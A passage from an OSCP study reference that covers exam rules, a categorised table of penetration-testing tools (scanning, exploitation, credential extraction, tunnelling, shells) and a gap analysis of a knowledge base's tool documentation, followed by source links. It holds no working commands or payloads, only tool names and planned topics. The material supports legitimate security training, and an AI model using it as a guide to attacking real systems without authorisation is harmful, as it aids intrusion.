- Cannot use Metasploit for pivoting (would affect multiple targets)

### Prohibited Techniques
- Responder poisoning/spoofing attacks
- Persistence mechanisms
- Any form of AI/LLM assistance
- Commercial tools

### Proctoring
- Webcam and screen sharing required
- Proctored via browser extension
- All activity must be on proctored machine

### Report Requirements
- Must document all steps for each machine
- Screenshots of proof.txt with `ipconfig`/`ifconfig` and `whoami`
- Methodology and tool usage documentation
- Professional penetration test report format

---

## Tool Reference

### Essential Tools for OSCP

| Category | Tool | Purpose |
|----------|------|---------|
| **Scanning** | Nmap | Port/service scanning |
| | RustScan | Fast port scanning |
| | Masscan | Mass port scanning |
| **Web** | Gobuster | Directory busting |
| | Feroxbuster | Recursive content discovery |
| | Nikto | Web vulnerability scanning |
| | Burp Suite | Web application testing |
| | ffuf | Web fuzzing |
| **Exploitation** | Metasploit | Exploitation framework |
| | msfvenom | Payload generation |
| | SearchSploit | Exploit database search |
| **Password** | Hydra | Online brute force |
| | John the Ripper | Offline cracking |
| | Hashcat | GPU-accelerated cracking |
| **Privilege Escalation** | LinPEAS | Linux enumeration |
| | WinPEAS | Windows enumeration |
| | pspy | Process monitoring |
| **Active Directory** | BloodHound | AD visualization |
| | CrackMapExec | AD Swiss army knife |
| | Impacket | Python AD toolkit |
| | Mimikatz | Credential extraction |
| | Evil-WinRM | WinRM shell |
| | Rubeus | Kerberos attacks |
| | Kerbrute | Kerberos brute force |
| **Tunneling** | Chisel | HTTP tunneling |
| | Ligolo-ng | Tunnel with TUN interface |
| | SSH | Standard tunneling |
| | Proxychains | Proxy chains |
| **Shells** | Netcat | Network Swiss army knife |
| | Socat | Advanced netcat |
| | rlwrap | Readline wrapper |
| **File Transfer** | Python HTTP | Simple HTTP server |
| | Impacket-smbserver | SMB file sharing |
| **SMB** | smbclient | SMB client |
| | smbmap | SMB enumeration |
| | enum4linux | SMB/RPC enumeration |

---

## Knowledge Base Gap Analysis

### Comparing pwnbox knowledge base with OSCP requirements:

#### Current pwnbox Tool Documentation

Based on the repository structure, the following tools are documented:
- bloodhound
- chisel
- crackmapexec
- enum4linux
- evil-winrm
- feroxbuster
- gobuster
- hashcat
- hydra
- impacket
- john
- kerbrute
- ligolo-ng
- linpeas
- masscan
- metasploit-framework
- mimikatz
- msfvenom
- nc (netcat)
- netexec
- nmap
- proxychains
- pspy
- responder
- rlwrap
- rustscan
- smbclient
- smbmap
- socat
- ssh
- winpeas

#### Potential Gaps to Address

**Tools Not Documented:**
- [ ] Burp Suite (web testing)
- [ ] ffuf (web fuzzing)
- [ ] nikto (web scanning)
- [ ] dirb/dirbuster (directory busting)
- [ ] wfuzz (web fuzzing)
- [ ] nuclei (vulnerability scanning)
- [ ] whatweb (web fingerprinting)
- [ ] searchsploit (exploit database)
- [ ] sqlmap (SQL injection)
- [ ] wpscan (WordPress scanning)
- [ ] sshuttle (VPN-like tunneling)
- [ ] PowerView (AD enumeration)
- [ ] SharpHound (BloodHound collector)
- [ ] PrintSpoofer/GodPotato (Windows privesc)
- [ ] Linux Exploit Suggester
- [ ] Windows Exploit Suggester
- [ ] CeWL (custom wordlist generator)
- [ ] crunch (wordlist generator)

**Techniques/Methodology Not Documented:**
- [ ] OSCP methodology workflow
- [ ] Web application attack methodology
- [ ] SQL injection techniques
- [ ] XSS exploitation
- [ ] File inclusion attacks (LFI/RFI)
- [ ] Command injection
- [ ] File upload attacks
- [ ] Password attack methodology
- [ ] Windows privilege escalation checklist
- [ ] Linux privilege escalation checklist
- [ ] Active Directory attack path
- [ ] Lateral movement techniques
- [ ] Pivoting methodology
- [ ] Shell stabilization techniques
- [ ] Report writing guidelines

**Reference Materials Needed:**
- [ ] Common hash types and modes
- [ ] Reverse shell one-liners
- [ ] Service enumeration quick reference
- [ ] Port-to-service mapping
- [ ] Default credentials database
- [ ] GTFO Bins reference
- [ ] LOLBAS reference
- [ ] Common CVEs and exploits

---

## Sources

### Official OffSec Resources
- [PEN-200 Course Page](https://www.offsec.com/courses/pen-200/)
- [PEN-200 Syllabus PDF](https://www.offsec.com/documentation/penetration-testing-with-kali.pdf)
- [OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
- [OSCP Exam FAQ](https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ)
- [OSCP Exam Changes](https://help.offsec.com/hc/en-us/articles/29865898402836-OSCP-Exam-Changes)
- [PEN-200 2023 Update Blog](https://www.offsec.com/blog/pen-200-2023/)

### Community Resources
- [TJnull's OSCP Preparation Guide](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html)
- [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS Project](https://lolbas-project.github.io/)

### Exam Guides
- [StationX OSCP Exam Guide 2026](https://www.stationx.net/oscp-exam-guide/)
- [FlashGenius OSCP 2025 Guide](https://flashgenius.net/blog-article/oscp-certification-ultimate-2025-guide-to-passing-oscp)

---

*Document generated: 2025-12-27*
*Purpose: OSCP curriculum reference and pwnbox knowledge base gap analysis*
